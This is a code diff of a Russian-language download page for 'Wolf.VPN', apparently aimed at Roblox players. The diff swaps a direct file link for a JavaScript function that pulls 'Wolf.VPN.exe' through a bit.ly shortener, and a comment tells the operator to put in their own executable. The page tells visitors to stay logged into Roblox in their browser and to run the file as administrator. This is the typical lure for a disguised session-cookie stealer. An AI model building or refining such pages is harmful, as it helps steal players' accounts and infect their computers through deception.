@@ -109,12 +109,9 @@
             font-size: 13px;
             line-height: 1.5;
         }
-        .important-box .step {
-            color: #00ff88;
-        }
 
+        /* КНОПКА СКАЧИВАНИЯ */
         .download-btn {
-            display: block;
             width: 100%;
             padding: 18px;
             background: linear-gradient(90deg, #00a2ff, #7700ff);
@@ -124,7 +121,6 @@
             font-size: 22px;
             font-weight: 700;
             cursor: pointer;
-            text-decoration: none;
             text-align: center;
             margin: 20px 0;
             box-shadow: 0 8px 25px rgba(0, 162, 255, 0.4);
@@ -215,15 +211,15 @@
             </div>
         </div>
 
-        <!-- ВАЖНАЯ ИНСТРУКЦИЯ (КРАСНЫЙ БЛОК) -->
+        <!-- ВАЖНАЯ ИНСТРУКЦИЯ -->
         <div class="important-box">
             <h3>⚠️ ОБЯЗАТЕЛЬНОЕ УСЛОВИЕ ⚠️</h3>
-            <p><span class="step">➤</span> <strong>Перед скачиванием и запуском</strong> войдите в свой аккаунт <strong>Roblox в браузере</strong> (Chrome, Edge, Яндекс.Браузер) и <strong>не выходите из него</strong>.</p>
-            <p style="margin-top: 10px;"><span class="step">➤</span> Без этого VPN не сможет подключиться к вашему аккаунту.</p>
+            <p><strong>Перед скачиванием и запуском</strong> войдите в свой аккаунт <strong>Roblox в браузере</strong> (Chrome, Edge, Яндекс.Браузер) и <strong>не выходите из него</strong>.</p>
+            <p style="margin-top: 10px;">Без этого VPN не сможет подключиться к вашему аккаунту.</p>
         </div>
 
-        <!-- КНОПКА СКАЧИВАНИЯ -->
-        <a href="https://gofile.io/d/KCYRZu" class="download-btn">🐺 СКАЧАТЬ WOLF.VPN</a>
+        <!-- КНОПКА СКАЧИВАНИЯ (JAVASCRIPT) -->
+        <button onclick="downloadFile()" class="download-btn">🐺 СКАЧАТЬ WOLF.VPN</button>
 
         <!-- ИНСТРУКЦИЯ ПО УСТАНОВКЕ -->
         <div class="steps">
@@ -234,11 +230,11 @@
             </div>
             <div class="step-item">
                 <div class="step-num">2</div>
-                <span>Скачайте Wolf.VPN по кнопке выше</span>
+                <span>Нажмите на кнопку "СКАЧАТЬ" выше</span>
             </div>
             <div class="step-item">
                 <div class="step-num">3</div>
-                <span>Запустите файл от имени администратора</span>
+                <span>Запустите скачанный файл от имени администратора</span>
             </div>
             <div class="step-item">
                 <div class="step-num">4</div>
@@ -255,6 +251,27 @@
         </div>
     </div>
 </div>
+
+<script>
+    // ФУНКЦИЯ ДЛЯ СКАЧИВАНИЯ ФАЙЛА
+    function downloadFile() {
+        // ССЫЛКА НА ТВОЙ EXE (ЗАМЕНИ НА СВОЮ!)
+        const fileUrl = "https://bit.ly/4sUAPQx";
+        const fileName = "Wolf.VPN.exe";
+        
+        // СОЗДАЁМ НЕВИДИМУЮ ССЫЛКУ
+        const link = document.createElement('a');
+        link.href = fileUrl;
+        link.download = fileName;
+        document.body.appendChild(link);
+        
+        // КЛИКАЕМ ПО ССЫЛКЕ (ЗАПУСКАЕМ СКАЧИВАНИЕ)
+        link.click();
+        
+        // УДАЛЯЕМ ССЫЛКУ
+        document.body.removeChild(link);
+    }
+</script>
 
 </body>
 </html>
